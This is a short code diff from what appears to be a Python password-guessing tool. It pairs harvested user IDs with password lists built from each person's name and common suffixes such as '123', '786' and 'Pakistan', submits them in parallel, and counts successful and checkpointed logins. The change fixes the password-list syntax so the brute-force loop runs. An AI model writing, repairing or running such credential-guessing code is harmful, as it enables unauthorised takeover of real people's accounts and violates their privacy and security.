@@ -429,9 +429,9 @@ class __chigoue__:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                           pwx = [name, 000786, 786786, Pakistan, xz[0]+"123", xz[0]+"1122", xz[0]+"12345", xz[0]+xz[1], xz[0]+"@", xz[0]+"@@", xz[0]+"786"]
+                           pwx = [name,"000786","786786","Pakistan",xz[0]+"123",xz[0]+"1122",xz[0]+"12345",xz[0]+xz[1],xz[0]+"@",xz[0]+"@@",xz[0]+"786"]
                        else:
-                           pwx = [name, 000786, 786787, Pakistan, xz[0]+"123", xz[0]+"1122", xz[0]+"12345", xz[0]+xz[1], xz[0]+"@", xz[0]+"@@", xz[0]+"786"]
+                           pwx = [name,"000786","786787","Pakistan",xz[0]+"123",xz[0]+"1122",xz[0]+"12345",xz[0]+xz[1],xz[0]+"@",xz[0]+"@@",xz[0]+"786"]
                        kirim.submit(self.__metode__,url,uid,pwx)
                    except:pass
             hasil(ok,cp)
